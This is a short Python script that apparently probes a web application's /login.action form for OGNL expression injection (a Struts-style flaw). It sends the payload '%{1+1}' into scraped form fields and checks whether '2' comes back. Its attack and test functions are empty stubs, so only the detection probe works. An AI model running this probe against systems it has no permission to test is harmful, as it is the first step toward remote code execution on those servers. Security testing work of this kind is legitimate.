import requests
import base_def
import argparse
import urllib
from urllib import parse
import bs4

arg_parser = argparse.ArgumentParser()
print("the scripts has 2 parameters")
argparse = base_def.start_help(arg_parser)
url = "http://" + argparse.ip + ":" + argparse.port
proxies = base_def.default_proxies()
header = base_def.default_header()

def find_target_get_parameters(url, argparse, header, proxies):
    args_tmp = []
    response = requests.get(url, headers=header)

    if response.status_code == 200:
        content = response.text
        soup = bs4.BeautifulSoup(content, 'html.parser')
        for i in soup.find_all('input'):
            if i.get('type') != 'submit':
                args_tmp.append(i.get('name'))
                print("input args " + str(i.get('name')) + " has found")
    return args_tmp


def test_target_post(url, argparse, header, proxies):
    return 0


def attack_target_post(url, argparse, header, proxies, command):
    return 0


if __name__ == "__main__":
    args = find_target_get_parameters(url, argparse, header, proxies)
    payload = urllib.parse.quote("%{1+1}")
    post_text = args[0] + "=" + payload + "&" + args[1] + "=" + payload

    response1 = requests.post(url + "/login.action", data=post_text, proxies=proxies, headers=header)

    if response1.status_code == 200:
        bool_get = False
        soup_res = bs4.BeautifulSoup(response1.text, 'html.parser')
        for i in soup_res.find_all('input'):
            if i.get('value') == "2":
                bool_get = True

        if bool_get == True:
            print("we get it!")
